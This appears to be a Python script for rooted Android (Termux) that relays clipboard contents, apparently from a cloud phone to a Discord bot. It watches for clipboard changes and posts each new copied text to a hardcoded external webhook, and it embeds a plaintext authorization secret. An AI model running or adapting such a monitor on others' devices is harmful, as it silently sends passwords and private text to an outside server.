import sys
import time
import subprocess
import requests

if len(sys.argv) < 3:
    sys.exit(1)

device_id = sys.argv[1]
guild_id = sys.argv[2]
URL_WEBHOOK = "https://hapiephoneugph.vercel.app/api/webhook"
AUTH_SECRET = "ugphoneoficialbrasil13willianz4z4oof$$$pitucho13"
headers = {"Content-Type": "application/json", "Authorization": AUTH_SECRET}

def force_focus_and_read():
    try:
        subprocess.run('su -c "am start --activity-brought-to-front com.termux/.TermuxActivity"', shell=True, stdout=subprocess.DEVNULL)
        time.sleep(0.1)
        texto = subprocess.check_output("termux-clipboard-get", shell=True).decode('utf-8').strip()
        subprocess.run('su -c "input keyevent 4"', shell=True, stdout=subprocess.DEVNULL)
        return texto
    except:
        return ""

last_clip = force_focus_and_read()

cmd = 'su -c "logcat -b events | grep CLIPBOARD_CHANGED"'
process = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)

while True:
    line = process.stdout.readline()
    if line:
        time.sleep(0.2)
        current = force_focus_and_read()
        if current and current != last_clip:
            try:
                requests.post(URL_WEBHOOK, json={"texto": current, "device_id": device_id, "guild_id": guild_id}, headers=headers, timeout=5)
                last_clip = current
            except:
                pass
    
    if process.poll() is not None:
        process = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
